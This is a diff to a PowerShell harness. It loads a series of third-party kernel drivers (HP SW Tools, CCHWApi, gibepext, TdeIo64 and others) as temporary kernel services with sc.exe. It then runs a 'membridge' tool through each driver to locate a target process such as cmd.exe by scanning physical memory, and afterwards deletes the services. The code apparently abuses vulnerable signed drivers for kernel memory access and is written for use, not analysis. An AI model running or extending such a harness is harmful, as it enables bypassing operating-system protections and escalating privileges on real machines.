@@ -31,6 +31,19 @@ $backends = @(
     'swtoolsdriver','hp_swtools','hp_swtools_v1',
     'cchwapi_2_12','cchwapi_ext_4_5','cchwapi_2_9'
 )
+$driverPaths = @{
+    'cchwapi_2_9'     = 'drivers\CCHWApi_sys\CCHWApi.sys'
+    'cchwapi_2_12'    = 'drivers\CCHWApi(1)_sys\CCHWApi(1).sys'
+    'cchwapi_ext_4_5' = 'drivers\CCHWApiExt(1)_sys\CCHWApiExt(1).sys'
+    'hp_swtools'      = 'drivers\HP SW TOOLS DRIVER_sys\HP SW TOOLS DRIVER.sys'
+    'swtoolsdriver'   = 'drivers\swtoolsdriver\swtoolsdriver.sys'
+    'hp_swtools_v1'   = 'drivers\hp_swtools_v1\HP_SWTOOLS_DRIVER_V1.sys'
+    'isharepp'        = 'drivers\isharepp\iSharePp.sys'
+    'gibepext'        = 'drivers\gibepext\gibepext.sys'
+    'gibepext2'       = 'drivers\gibepext2\gibepext2.sys'
+    'tdeio'           = 'drivers\tdeio\TdeIo64.sys'
+    'ufu_win10'       = 'drivers\ufu\win10_ufudev64.sys'
+}
 
 # Load/init progress.
 if (Test-Path $progressFile) {
@@ -98,11 +111,29 @@ $progress.running = [pscustomobject]@{
 }
 $progress | ConvertTo-Json -Depth 6 | Set-Content -LiteralPath $progressFile -Encoding UTF8
 
-$mbArgs = @('--backend',$next,'--locate','--pid',"$($target.Id)",'--name','cmd.exe',
+$mbArgs = @('--backend',$next,'--no-load','--locate','--pid',"$($target.Id)",'--name','cmd.exe',
             '--scan-start',$ScanStart,'--scan-size',$ScanSize)
 $ErrorActionPreference = 'Continue'
+# membridge's internal OpenSCManager path fails with access denied on this
+# system; create/start the service with sc.exe and use --no-load instead.
+$svcName = 'MembridgeBoot_' + $next
+$svcCreated = $false
+$driverPath = Join-Path $base $driverPaths[$next]
+if (Test-Path -LiteralPath $driverPath) {
+    & sc.exe create $svcName binPath= $driverPath type= kernel start= demand *> $null
+    if ($LASTEXITCODE -eq 0) { $svcCreated = $true }
+    & sc.exe start $svcName *> $null
+    Start-Sleep -Milliseconds 400
+    Write-RunLog ("service {0} create_ok={1} start_rc={2}" -f $svcName,$svcCreated,$LASTEXITCODE)
+} else {
+    Write-RunLog ("driver missing: {0}" -f $driverPath)
+}
 $output = (& $membridge @mbArgs 2>&1 | Out-String)
 $code = $LASTEXITCODE
+if ($svcCreated) {
+    & sc.exe stop $svcName *> $null
+    & sc.exe delete $svcName *> $null
+}
 if ($output) { Write-RunLog ("output backend={0}: {1}" -f $next, (($output -split "`r?`n" | Select-Object -Last 8) -join ' | ')) }
 $status = if ($code -eq 0) { 'COMPLETED' } else { "FAILED($code)" }
 
